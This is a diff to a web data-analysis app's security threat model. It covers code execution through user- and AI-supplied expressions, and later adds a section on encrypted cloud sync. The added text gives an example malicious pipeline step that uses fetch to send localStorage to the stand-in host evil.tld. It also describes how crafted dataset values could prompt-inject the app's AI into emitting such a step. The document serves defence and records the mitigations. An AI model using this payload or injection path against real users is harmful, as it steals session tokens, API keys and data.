@@ -45,22 +45,35 @@
 
 ### 3.2 Dynamic Expression Evaluation — Unsandboxed Code Execution
 
-**Threat:** User-supplied expressions are evaluated dynamically via the `Function` constructor in the main thread:
-- `runner.js:267` — `mutate`/`ai_tr` step arrow-function eval
-- `runner.js:653` — `mutate` expression step
-- `FeatureTab.jsx:94` — live preview of `mutate` expressions
-- `SimulateTab.jsx:91-133` — DGP expression evaluator
-- `FormatTab.jsx:73` — cell format expressions
+> **Updated 2026-06-05 (security re-review).** The root cause below was known; this update adds two **concrete attacker-controlled delivery paths** (imported/synced pipelines and the AI command bar) and records new `Function`-constructor sinks added since the original writeup. Re-rated and re-scoped — see "Delivery paths" and "Cross-device amplification".
 
-The `Function` constructor in the browser has full access to the global scope including `localStorage`, `indexedDB`, `fetch`, and DOM APIs. A crafted expression would silently exfiltrate the API key.
+**Threat:** Step expressions (`expr` / `cond` / `rules[].expr`, and `ai_tr` JS bodies) are compiled and run via the `Function` constructor **on the main thread**, which has full access to `localStorage`, `indexedDB`, `fetch`, and the DOM. Sinks:
+- `runner.js` — `mutate`, `if_else`, `case_when` step evaluation
+- `runner.js` — **`vector_assign` (conditional mode)** rule predicates *(added 2026-06-05)*
+- `runner.js` — `ai_tr` step arrow-function body (built by `DataStudio.addFillColumnStep`)
+- `FeatureTab.jsx` — live preview of `mutate` expressions
+- `SimulateTab.jsx` — DGP expression evaluator
+- `FormatTab.jsx` — cell format expressions
 
-**Risk rating:** **HIGH** — requires user to type or paste a malicious expression, or receive one via `ai_tr` (AI-generated). AI-generated expressions are pre-screened by Claude but not guaranteed safe.
+A crafted expression silently exfiltrates whatever the main thread can read: the **Supabase session token** (`localStorage`, persisted by supabase-js → account takeover + access to the user's synced data), the **Anthropic API key** in dev/non-proxy mode (`getApiKey()` reads `localStorage`), and any dataset in IndexedDB.
 
-**Mitigations:**
-- [ ] Move expression evaluation to a dedicated `Worker` — workers have no access to `localStorage`, `indexedDB`, or `document`
-- [ ] Pass only required column data into the worker; receive only the result array back
-- [ ] For `ai_tr`: always show generated expression to user before executing; never auto-run
-- [ ] Add a CSP header (see §3.5) — does not block dynamic `Function` eval but limits external script injection
+**Delivery paths (how attacker-controlled expressions reach the sink):**
+1. **Imported pipeline JSON — HIGH.** `components/wrangling/ImportPipelineButton.jsx` validates **only that each step's `type` is a known registry type** — it does *not* inspect `expr`/`cond`/`rules`. An imported `pipeline.json` replays immediately, so a `{ "type":"mutate", "expr":"fetch('https://evil.tld?d='+encodeURIComponent(JSON.stringify(localStorage)))" }` step executes on import. Attack = social-engineer the victim into importing a shared "analysis pipeline".
+2. **AI command bar — MEDIUM.** `services/AI/AIService.js#nlToPipeline` embeds **column sample values from the loaded dataset** into the model prompt; `pipeline/stepValidator.js#validateAISteps` permits `mutate` (category `features`) **without inspecting `expr`**. A crafted/untrusted dataset can prompt-inject the model into emitting a malicious `mutate`; `components/wrangling/NLCommandBar.jsx` previews only the step `type`/`desc` (not the `expr`), so the user may Apply without seeing the payload. Sink is code execution, not just text — beyond ordinary prompt injection.
+3. **Self-typed expression — LOW.** User pastes a malicious expression into a `mutate`/DGP field in their own session (self-XSS; low cross-user impact).
+
+**Risk rating:** **HIGH** (path 1 is a concrete stored-code-execution → credential/data exfiltration vector with a realistic social-engineering trigger).
+
+**Cross-device amplification:** roadmap item #4 (cross-device persistence) turns **server-synced pipelines into an auto-running untrusted-input channel** — path 1 would fire without an explicit file import. **This hardening must land before #4 ships.**
+
+**Mitigations — LANDED 2026-06-05** (spec `docs/superpowers/specs/2026-06-05-expr-sandbox-hardening-design.md`):
+- [x] **Worker global-scrub (the real boundary).** `exprEval.worker.js` nulls `fetch`/`XMLHttpRequest`/`WebSocket`/`EventSource`/`importScripts`/`Worker`/`navigator` at init → an evaluated expression (even one reconstructing a function via the constructor escape) has no network reach and no `localStorage`/`indexedDB`/DOM.
+- [x] **Route all expr to the worker + kill the unsafe fallback.** `runPipelineAsync` now routes `vector_assign`-conditional too; on worker failure it nulls the output column instead of re-evaluating on the main thread.
+- [x] **Identifier denylist** (`src/pipeline/exprGuard.js` `assertSafeExpr`/`isSafeExpr`) enforced at every compile site (worker `evalCol`+`evalScope`, and the residual sync `applyStep` mutate/if_else/case_when/vector_assign sites). Harness `exprGuard.test.mjs` 23/23.
+- [x] **Inspect AI/imported step expressions.** `ImportPipelineButton` blocks import of any step whose `expr`/`cond`/`cases`/`rules` reference a denylisted identifier; `validateAISteps` rejects unsafe AI-emitted expr steps (`stepValidator.test.mjs` 8/8).
+- [x] **Show the payload before Apply** in the `NLCommandBar` preview (raw `expr`/`cond` rendered per step). *(Import is hard-blocked on unsafe expr, so the import-confirm dialog shows the block reason rather than the payload.)*
+- [ ] **Residual (low-sev, self-scoped):** `FormatTab.applyManualPreview` builds its preview function from structured strip/replace config; the strip-`chars` are interpolated unescaped into a regex char-class (preview-only, current-user input). Escape `chars` or move to structured String ops. *Not an imported/AI vector.*
+- [ ] Add a CSP header (see §3.5) — complements the above by restricting `connect-src` to throttle exfiltration egress.
 
 ### 3.3 File Upload — Binary Parser Bounds Checking
 
@@ -161,6 +174,16 @@ These risks do not exist yet but **must be addressed before any backend code is 
 
 - If datasets are ever stored server-side: validate MIME type + magic bytes (not just extension), enforce per-user storage quotas, never execute uploaded content
 - **Prefer keeping datasets client-side** — this is the privacy-first promise; push computation to the browser
+
+### 4.2a Opt-in E2EE Cloud Sync
+
+- Cloud sync is opt-in per project. Plaintext artifacts stay in the browser; Supabase stores only AES-256-GCM ciphertext blobs, encrypted manifests, salt, and encrypted verifier material.
+- The sync passphrase and derived key are never sent to Supabase and are not logged. The key lives in memory for the browser session; recovery export is a user-held raw key file.
+- KDF/cipher boundary: `src/services/sync/crypto.js` is the only crypto module and uses WebCrypto PBKDF2-SHA-256 (310k iterations or higher) plus random 12-byte AES-GCM IVs per blob.
+- Server visibility: Supabase can see authenticated user id, project pid, object paths, blob sizes, timestamps, and versions. It cannot decrypt project metadata, raw data, pipelines, workbench state, model buffers, spatial maps, or coach chats.
+- RLS boundary: `synced_projects` rows are owner-scoped, and `synced-blobs` storage policies restrict object paths to the authenticated user's `auth.uid()/` prefix. Migration apply and advisor review remain pending Franco review.
+- Untrusted-pull guard: every decrypted pipeline is treated as hostile input and must pass `pipeline/exprGuard.assertSafeExpr` over `expr`, `cond`, `cases[].cond`, `rules[].expr`, and `js` before any IndexedDB write.
+- Sharing/key exchange is out of scope for Phase 4a-1 and must not be inferred from this model.
 
 ### 4.3 Server-Side Expression Evaluation
 
